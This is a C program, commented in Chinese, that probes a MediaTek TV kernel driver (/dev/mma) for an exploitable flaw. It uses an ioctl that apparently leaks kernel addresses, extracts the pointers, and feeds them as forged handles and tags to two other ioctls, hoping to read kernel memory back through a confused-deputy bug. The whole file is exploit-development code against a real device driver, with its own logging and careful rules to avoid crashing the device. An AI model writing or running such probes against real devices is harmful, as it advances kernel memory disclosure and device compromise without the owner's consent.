/*
 * mmaaddr.c — 定向试探：能否让 MMA 命令把"已知内核地址"当作句柄/指针回读内容。
 *
 * 设计铁律（绝不打挂设备）：
 *   1. 只喂 `mma_get_pipeid` 自己返回的那两个**确凿内核地址**做输入；
 *   2. 绝不对任意/未知物理地址做 mmap 或宽范围 ioctl 盲扫；
 *   3. 全程只有只读查询类命令，无写内存动作；
 *   4. 任一命令若返回"能读"的信号（EINVAL 之外的返回、或 r>=0+有内容），即为可深挖信号。
 *
 * 已确认事实：
 *   - mma_get_pipeid (0x80304d02) 在 misysdiagnose 域成功，泄露内核地址
 *   - mma_get_meminfo (0xc0304d0b) 需"合法 mma 句柄"，对任意 fd 是 EINVAL
 *   - 目标：看是否有命令把"名字/句柄"当"可回读内核地址"用（confused-deputy 取向）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define PIPEID  0x80304d02u
#define MEMINFO 0xc0304d0bu
#define QUERY   0xc01c4d0du

static FILE *glog;

static void step(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    char b[1024]; vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    printf("%s\n", b);
    if (glog) { fprintf(glog, "%s\n", b); fflush(glog); fsync(fileno(glog)); }
    sync();
}
static void dumph(const char *t, const unsigned char *d, int n) {
    char lb[256], ab[64], *h = lb, *a = ab;
    for (int i = 0; i < n; i++) {
        h += snprintf(h, lb + sizeof lb - h, "%02x ", d[i]);
        a += snprintf(a, ab + sizeof ab - a, "%c", (d[i] >= 32 && d[i] < 127) ? d[i] : '.');
    }
    step("%s: %s |%s|", t, lb, ab);
}

int main(void) {
    glog = fopen("/data/data/com.mediatek.tv.factory/mmaaddr.log", "w");
    setvbuf(stdout, NULL, _IONBF, 0);
    step("[0] mmaaddr start uid=%d\n", getuid());

    int fd = open("/dev/mma", O_RDWR);
    step("[1] open /dev/mma fd=%d %s", fd, fd < 0 ? strerror(errno) : "");
    if (fd < 0) return 1;

    /* ---- 第一步：取 pipeid，拿当前确切内核地址 ---- */
    unsigned char p[64]; memset(p, 0, sizeof p);
    errno = 0;
    int r1 = ioctl(fd, PIPEID, p);
    step("[2] get_pipeid r=%d errno=%d(%s)", r1, errno, strerror(errno));
    if (r1 >= 0) dumph("pipeid", p, 48);

    uint64_t a1 = 0, a2 = 0;
    for (int off = 0; off + 8 <= 48; off++) {
        uint64_t v; memcpy(&v, p + off, 8);
        if ((v & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
            step("  [p+0x%02x] u64 = 0x%016llx (内核候选)", off, (unsigned long long)v);
            if (!a1) a1 = v; else if (!a2 && v != a1) a2 = v;
        }
    }
    step("  a1=0x%016llx a2=0x%016llx", (unsigned long long)a1, (unsigned long long)a2);

    /* ---- 2. 把 a1/a2 的低32位当作 fd 喂给 get_meminfo（定向 fd 混淆） ---- */
    uint64_t cands[2] = { a1, a2 };
    for (int ci = 0; ci < 2; ci++) {
        if (!cands[ci]) continue;
        unsigned char mi[512]; memset(mi, 0, sizeof mi);
        uint32_t low = (uint32_t)cands[ci];
        memcpy(mi + 0x24, &low, 4);
        errno = 0;
        int r = ioctl(fd, MEMINFO, mi);
        step("[3.%d] get_meminfo(as-fd=0x%08x) r=%d errno=%d(%s)", ci, low, r, errno, strerror(errno));
        if (r >= 0) dumph("  mem", mi, 48);
    }

    /* ---- 3: query_buf_tag 地址当 tag ---- */
    {
        unsigned char q[64]; memset(q, 0, sizeof q);
        memcpy(q, &a1, 8); memcpy(q + 0x10, &a2, 8);
        errno = 0;
        int r = ioctl(fd, QUERY, q);
        step("[4] query_buf_tag(addr-as-tag) r=%d errno=%d(%s)", r, errno, strerror(errno));
        if (r >= 0) dumph("  tag", q, 64);
    }

    close(fd);
    step("[END] 已知地址定向试探完成");
    return 0;
}